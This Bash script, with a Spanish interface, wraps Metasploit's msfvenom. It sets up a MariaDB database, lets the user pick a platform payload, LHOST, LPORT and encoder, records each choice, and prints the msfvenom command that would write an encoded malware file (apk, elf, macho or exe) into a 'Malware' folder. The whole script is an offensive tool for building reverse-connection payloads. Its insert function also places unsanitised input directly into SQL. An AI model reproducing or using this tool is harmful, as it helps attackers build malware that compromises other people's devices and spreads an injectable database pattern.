#!/bin/bash

default_path="/home/$USER/Desktop/Malware"
database="Generación_de_payload"

check_admin() {
    if [[ $(id -u) != 0 ]]; then
        echo "Este script debe ejecutarse con privilegios de administrador."
        exit 1
    fi
}

check_mariadb_status() {
    service_status=$(sudo service mariadb status)

    if [[ $service_status == *"stopped"* ]]; then
        echo "MariaDB está detenido. Se procederá a iniciarlo."
        sudo service mariadb start
    else
        echo "MariaDB está en ejecución."
    fi
}

check_mariadb() {
    if ! command -v mariadb &> /dev/null; then
        echo "MariaDB no está instalada. Se procederá con la instalación y configuración inicial."

        sudo apt update
        sudo apt install mariadb-server -y

        sudo mysql_secure_installation

        echo "MariaDB ha sido instalada y configurada correctamente."
    else
        check_mariadb_status
    fi
}

create_database() {
    sudo mariadb -e "CREATE DATABASE IF NOT EXISTS $database;"
    sudo mariadb -e "USE $database; CREATE TABLE IF NOT EXISTS payloads (id INT AUTO_INCREMENT PRIMARY KEY, module VARCHAR(255), lhost VARCHAR(255), lport INT, encoder VARCHAR(255), file VARCHAR(255), path VARCHAR(255));"
}

insert_payload() {
    module="$1"
    lhost="$2"
    lport="$3"
    encoder="$4"
    file="$5"
    path="$6"

    sudo mariadb -e "USE $database; INSERT INTO payloads (module, lhost, lport, encoder, file, path) VALUES ('$module', '$lhost', $lport, '$encoder', '$file', '$path');"
}

list_payloads() {
    echo "Tabla de payloads"
    echo "================="
    sudo mariadb -e "USE $database; SELECT * FROM payloads;"
}

check_admin

check_mariadb

create_database

while true; do
    echo
    echo "Menú"
    echo "===="
    echo "1. Tabla de payloads"
    echo "2. Generar payload"
    echo "3. Salir"
    echo

    read -p "Selecciona una opción: " choice

    case $choice in
        1)
            list_payloads
            ;;
        2)
            echo
            echo "Selecciona la plataforma:"
            echo "========================"
            echo "1. Android"
            echo "2. Linux"
            echo "3. macOS"
            echo "4. Windows"
            echo

            read -p "Selecciona el número de plataforma: " platform_number

            case $platform_number in
                1)
                    os="Android"
                    default_format="apk"
                    ;;
                2)
                    os="Linux"
                    default_format="elf"
                    ;;
                3)
                    os="macOS"
                    default_format="macho"
                    ;;
                4)
                    os="Windows"
                    default_format="exe"
                    ;;
                *)
                    echo "Plataforma inválida. Por favor, selecciona una opción válida."
                    continue
                    ;;
            esac

            payloads=$(msfvenom --list payloads | grep -E "${os,,}/" | awk '{print NR, $1}')

            if [ -z "$payloads" ]; then
                echo "No hay payloads disponibles para $os."
                continue
            fi

            echo
            echo "Payloads disponibles para $os:"
            echo "=============================="
            echo "$payloads"
            echo

            read -p "Selecciona el número de payload: " payload_number

            selected_payload=$(echo "$payloads" | awk -v num=$payload_number 'NR==num{print $2}')

            read -p "LHOST: " lhost
            read -p "LPORT: " lport

            encoders=$(msfvenom --list encoders | awk '{print NR, $0}')

            if [ -z "$encoders" ]; then
                echo "No hay encoders disponibles."
                continue
            fi

            echo
            echo "Encoders disponibles:"
            echo "====================="
            echo "$encoders"
            echo

            read -p "Selecciona el número de encoder: " encoder_number

            selected_encoder=$(echo "$encoders" | awk -v num=$encoder_number 'NR==num{print $2}')

            read -p "Nombre del archivo (sin extensión): " file

            if [ -z "$file" ]; then
                file="payload"
            fi

            file_with_extension="$file.$default_format"

            if [ -z "$custom_path" ]; then
                path=$default_path/$os
            else
                path=$custom_path/$os
            fi

            mkdir -p "$path"

            insert_payload "$selected_payload" "$lhost" "$lport" "$selected_encoder" "$file_with_extension" "$path/$file_with_extension"

            command="msfvenom -p $selected_payload LHOST=$lhost LPORT=$lport -e $selected_encoder -f $default_format -o $path/$file_with_extension"
            echo "Comando: $command"
            echo "Payload insertado correctamente en la base de datos."
            ;;
        3)
            exit 0
            ;;
        *)
            echo "Opción inválida. Por favor, selecciona una opción válida."
            ;;
    esac
done
